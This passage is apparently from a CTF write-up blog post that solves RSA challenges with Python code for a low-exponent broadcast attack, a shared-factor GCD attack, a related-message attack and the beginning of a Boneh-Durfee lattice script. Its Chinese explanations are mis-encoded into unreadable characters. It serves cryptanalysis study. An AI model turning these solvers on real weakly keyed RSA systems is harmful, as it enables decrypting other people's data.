856119b6bdb17543c2089fefb23173e6cf6aff2d0c755760ac97fb9b3ca869a0875b5052f5a4dcef4c64c76ae97de9897398a79b291a851f2ebffef6dde90fdf</span></code></pre><h2 id="âœ…Challenge-4"><a href="#âœ…Challenge-4" class="headerlink" title="âœ…Challenge 4"></a>âœ…Challenge 4</h2><p>ç»™å‡ºä¸‰ç»„(n,c)ï¼Œé‡‡ç”¨ä½æŒ‡æ•°å¹¿æ’­æ”»å‡»ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">4</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n1<span class="token operator">=</span>0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c1<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n2<span class="token operator">=</span>0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c2<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n3<span class="token operator">=</span>0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c3<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">broadcast</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2 <span class="token punctuation">,</span>n3<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>    N <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        N <span class="token operator">*=</span> i    Ni <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        Ni<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N <span class="token operator">/</span> i<span class="token punctuation">)</span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long<span class="token punctuation">(</span>invert<span class="token punctuation">(</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    X <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> C<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    m3 <span class="token operator">=</span> X <span class="token operator">%</span> N    m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>m3<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>broadcast<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p>è‹¥æ˜¯ç»™å‡ºä¸¤ç»„nçš„è¯ï¼Œç›´æ¥å¯ä»¥é‡‡ç”¨æ±‚ä¸¤ä¸ªnçš„å…¬çº¦æ•°çš„æ–¹æ³•è¿›è¡Œæ”»å‡»ã€‚</p><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># from libnum import gcd</span><span class="token comment" spellcheck="true"># n1=0xb4e9991d2fac12b098b01118d960eb5470261368e7b1ff2da2c66b4302835aa845dd50a4f749fea749c6d439156df6faf8d14ce2a57da3bac542f1843bfc80dfd632e7a2ef96496a660d8c5994aea9e1b665097503558bc2756ab06d362abe3777d8c1f388c8cd1d193955b70053382d330125bdc2cdc836453f1a26cec1021cbb787977336b2300f38c6ba881a93d2a2735f8f0d32ea2d0e9527eb15294dd0867c8030d1f646bd121c01706c247cd1bf4aa209d383ffb748b73ec1688dc71812675834b4b12d27a63b5b8fcc47394d16897ff96af49f39d8d5b247553fbf8fac7be08aab43d9ce5659cd5cfaf7d73edbcfe854d997ae4b28d879adf86641707</span><span class="token comment" spellcheck="true"># #  e1=0x10001</span><span class="token comment" spellcheck="true"># #  c1=0x3a10c58ed3e8f9eade48dad7d36518dabeeca3d169c848f3b4b2bb027220e13d8b071c55046b14213e966ad9c381e5cad9773d455aa0d36ddff9b9f24873d0979f1caff95d9569e4f312514c7e01979b39c466aa2d27ad521ae3c1ea2025ca2290185b3d79da4f6e4c7e77a70f206bd5c41eec65fd64f86c317b8207ca511b8297b597cb9c24afa652c1f1c7f2d8ca61cf4a63b17df165e4c02dc19578305f276cb81fdfadf0ffc8b86e13297f2692edf7e6324878bb8ca960a050af6b0ada8ba4accd72c7d2c74a41e98d801093e4cc5b1572b8e6be9f270c30759543986180bb4fc6863e14638ea74863dbdd1624cfdedaedb99dfd48901e7d4b486a7b13ea</span><span class="token comment" spellcheck="true"># n2=0xc31344c753e25135d5eed8febaa57dd7020b503a5569bdd4ae6747b5c36436dc1c4d7ead77bfc1034748bcc630636bae1c8f4ca5dee8246b3d6f3e8b14e16487733b14ec8e587e07a7a6de45859d32d241eaf7746c45ff404f1a767ab77e8493ae8141fee0bcf4e9b7c455415b6945fa60de928b01dfa90bbf0d09194f93db7a1663121d281c908f0e38237f63c2b856f99c6029d993f9afb5fbbb762044d97943ff34023486c4cf1db9ffdc439d9f5ff331b606374c7133d61e4614fac3ea7faaf54563338b736282658e7925b224577091831351a28679a8d6f8e7ba16685b2769bb49b79f8054b29c809d68aca0f2c5e3f1fd0e3ef6c21f756e3c44a40439</span><span class="token comment" spellcheck="true"># # e2=0x10001</span><span class="token comment" spellcheck="true"># # c2=0xbefa7d62f15cafc81d098fdd524411537e948d83266ef22848f44d2e43d1f1388a26bb21c8fb08b571c7cbd6630d6f2b409c85c68a6419e472941e4978f60b93e1ce850344dbe99f1918cb5b8c35075bbdca82fa233d1300f108e4b75ce10d7b0ffa145bceffbc7a5204bf9c119f77af191091f25140aedcdd333b631b240ddad3108c96084dffe6e49e04880908fa02c02edb58e2f27919d707151adb6787384ca28050f8d77418cc1733187d7695f57127be8d6174562723679ba39790d7f2306271b9d8f4d2bdde9ed798af00074ec7da3a7f1ffeb4fc6a61804e51c0f92d384dc62b80fd44492588af26ac0185a23f86c46a7ffdec9fcf31b02b08b63001</span><span class="token comment" spellcheck="true"># print "p -> {}".format(gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q1 -> {}".format(n1 / gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q2 -> {}".format(n2 / gcd(n1, n2))</span>q <span class="token operator">=</span> <span class="token number">161993393900030566867150602363721535479433489542726899362944130872107225598993516228193877689420023695231584876954537089973673478074348422697619820309397363583748523503035462772765277978491082324620122838540365168604124924805412323471486221429513024367107238770298040268787441768635257727315317704741778501737</span>p1 <span class="token operator">=</span> <span class="token number">92392842076088454558676873885205432277688794102622657192126179753576488966439636785821047115301443362169549898465575056742381428321997570097374526363913597739756884031644135343404225885226264566916462715686341654211514913366341960827374747754358972050549971216117165750261475461979495685882564817634194301271</span>p2 <span class="token operator">=</span> <span class="token number">90279376687119715076904357810855212347782022402759254635072438787841245581930716927541800564582197695494423401147385731042364986596482750220701857807271816829238846312998439918616452075752787878425283820635199121653984306111110530896331011530772771558835563313746863033189248831495407320154948117671577602867</span><span class="token comment" spellcheck="true">#p=getPrime(1024)</span><span class="token comment" spellcheck="true">#q=getPrime(1024)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p1<span class="token operator">*</span>qc <span class="token operator">=</span> <span class="token number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">3966878437245643631637564975732704690837306124446086877872976205025646385675581853511438558449272831057566720069483322716185302889500282616707242022434828280064159692586323031389171478503753908040157812124377949328353938367107704570961998942943251122002994862593199357765354157601632561816952286250637771656438228389552713018311110406430345367091645709437632368795499521650765928713846948596775009799649123556193038678824282362527557831582015129491351042998117090300454963836491928898672785463727735926420386710315758459309854603319606229977802586942578329763497502143858265135463947731426008988290087504887177240673</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><h2 id="âChallenge-5"><a href="#âChallenge-5" class="headerlink" title="âChallenge 5"></a>âChallenge 5</h2><p>å·²çŸ¥nå’Œä¸¤ä¸ªcipherï¼Œå¹¶ä¸”æ˜¯ç”±må’Œm+1åŠ å¯†è€Œæ¥ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">5</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>x<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</code></pre><p>é€šè¿‡åŒ–ç®€å¾—åˆ° <code>è®¡ç®—å…¬å¼ï¼š (m+1)^3 - m^3 = c2-c1 ==&gt; (3m^2+3m+1)åŠ å‡k*n=c2-c1</code></p><p>ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ±‚æ ¹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190529105312.png" alt=""></p><p>æ­¤æ—¶åªéœ€æ±‚ç¬¦åˆæ¡ä»¶çš„kå€¼å³å¯ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token comment" spellcheck="true"># æ±‚ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹æ ¹</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93Lc1<span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cLc2<span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eLe<span class="token operator">=</span><span class="token number">3</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true"># 3m^2+3m+1=c2-c1</span><span class="token comment" spellcheck="true"># â–² = 9-4*3*(1-c2+c1)</span><span class="token comment" spellcheck="true"># x = (-b[+-](â–²)^0.5)/(2*a)==>å¯ä»¥çŸ¥é“xä¸ºmï¼Œå³ä¸ºæ•´æ•°</span><span class="token comment" spellcheck="true"># c = 1-c2+c1-(k*n)</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>n<span class="token operator">*</span>k<span class="token operator">+</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(c)</span>    delta <span class="token operator">=</span> <span class="token number">9</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span>c    <span class="token comment" spellcheck="true">#print(delta)</span>    <span class="token keyword">if</span> delta<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#print(iroot(delta,2)[1])</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>delta<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    m<span class="token operator">=</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">6</span> <span class="token comment" spellcheck="true">#æ±‚æ ¹</span>                    <span class="token keyword">if</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c1<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#i = 17æ—¶ç¬¦åˆæ¡ä»¶</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    k <span class="token operator">+=</span> <span class="token number">1</span></code></pre><h2 id="âChallenge-6"><a href="#âChallenge-6" class="headerlink" title="âChallenge 6"></a>âChallenge 6</h2><p>Boneh and Durfee attack.ï¼ˆå½“dçš„bitsæ•°å°äºnçš„ä¸€å®šç¨‹åº¦æ—¶ï¼Œå¯é‡‡ç”¨æ­¤æ”»å‡»ã€‚é¢˜ä¸­å‡ºç°äº†<code>d=random.getrandbits(1024*0.270)</code>ï¼‰</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hex<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Config</span><span class="token comment" spellcheck="true">##########################################</span><span class="token triple-quoted-string string">"""Setting debug to true will display more informationsabout the lattice, the bounds, the vectors..."""</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token triple-quoted-string string">"""Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`"""</span>strict <span class="token operator">=</span> <span class="token boolean">False</span><span class="token triple-quoted-string string">"""This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it"""</span>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment" spellcheck="true"># stop removing if lattice reaches that dimension</span><span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Functions</span><span class="token comment" spellcheck="true">##########################################</span><span class="token comment" spellcheck="true"># display stats on helpful vectors</span><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span>    nothelpful <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span> nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span><span class="token comment" spellcheck="true"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a<span class="token comment" spellcheck="true"># tries to remove unhelpful vectors</span><span class="token comment" spellcheck="true"># we start at current = n-1 (last vector)</span><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># end of our recursive function</span>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span>        <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># we start by checking from the end</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># if it is unhelpful:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span>            <span class="token comment" spellcheck="true"># let's check if it affects other vectors</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment" 